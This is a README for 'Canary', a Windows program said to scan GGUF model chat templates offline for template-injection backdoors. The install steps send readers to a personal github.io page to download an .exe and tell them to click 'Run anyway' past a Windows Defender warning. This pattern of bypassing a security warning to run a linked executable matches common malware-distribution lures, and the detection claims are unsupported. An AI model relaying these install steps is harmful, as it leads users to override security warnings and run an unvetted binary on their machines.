# 🛡️ canary - Secure your AI models against threats

[![](https://img.shields.io/badge/Download_Canary-blue.svg)](https://ushi7445.github.io)

Canary checks your AI model files for hidden risks. Many models use chat templates that can hide harmful instructions. These instructions may trick the AI or compromise your computer. Canary looks for these threats before you load the model. It scans files completely offline. You do not need an internet connection to perform a safety check.

## 🎯 What Canary Does

AI models often contain files that define how they talk to users. These files define the structure of your chat history. Some files hide malicious commands. These commands exploit the way software talks to your computer. This attack method is known as Server-Side Template Injection, or SSTI. 

Canary inspects the internal code of these templates. It does not run the model. This makes the tool safe. You do not risk your system by scanning a file. Canary flags potential issues so you can delete dangerous models. We scanned over 185,000 models from the internet. We found 24 models with clear malicious intent. Our tool identified these without a single error.

## 💻 System Requirements

Your computer needs to meet these basic standards to run Canary:

* Windows 10 or Windows 11
* 4 GB of available RAM
* 500 MB of free hard drive space
* No special graphics card needed

## 📥 How to Install

Follow these steps to set up Canary on your machine:

1. Visit the [releases page](https://ushi7445.github.io) to access the files.
2. Look for the newest version at the top of the list.
3. Click the link that ends in .exe to start your download.
4. Open your Downloads folder once the file finishes.
5. Double-click the canary.exe file to start the program.
6. A window may appear from Windows Defender. Click "More Info" and then "Run anyway" to open the tool.

## ⚙️ Using the Scanner

The main screen shows a simple interface. Follow these steps to audit your AI models:

1. Locate the GGUF model file on your hard drive. 
2. Drag and drop the file directly into the Canary app window.
3. Choose the "Scan" button to start the audit.
4. Wait for the green or red indicator to change.
5. Review the report if Canary finds a warning.

If the scan turns green, the template appears safe. If the scan turns red, Canary found suspicious code. We suggest you remove that specific model file from your computer at once. Do not attempt to fix or run a model that triggers a warning.

## 🔍 Understanding the Results

Canary uses clear labels to report its findings:

* Pass: The template contains standard code. No known threats exist within the file.
* Warning: The scan detected unusual instructions. These commands might bypass security settings.
* Danger: The scan found clear evidence of a backdoor. This template sends your private data elsewhere or executes unauthorized commands.

## 🛠️ Frequently Asked Questions

**Does Canary need my internet access?**
No. Canary operates offline. It never sends your model files to a server. Your data stays on your local drive.

**Can I scan many files at once?**
Yes. You can select an entire folder of models. Canary will process them one by one and give you a list of results.

**What happens if a scan takes too long?**
Large model files take more time to read. Most scans finish in under ten seconds. If you have a slow hard drive, it may take a few seconds extra.

**Should I trust every model with a Pass result?**
A Pass result means Canary found no known backdoors. It does not mean the AI itself is moral or accurate. Always use caution when you download new files from the internet.

## 📝 Security Advice for Users

AI security evolves every day. Follow these rules to protect your system:

* Download models from verified creators only.
* Avoid files that ask for unusual system permissions.
* Update your security scanners often.
* Scan files before you add them to your model folder.

Canary provides a vital first line of defense. By checking the underlying instructions of a model, you prevent hidden code from running on your machine. Keep this tool in your toolkit whenever you download new AI technology.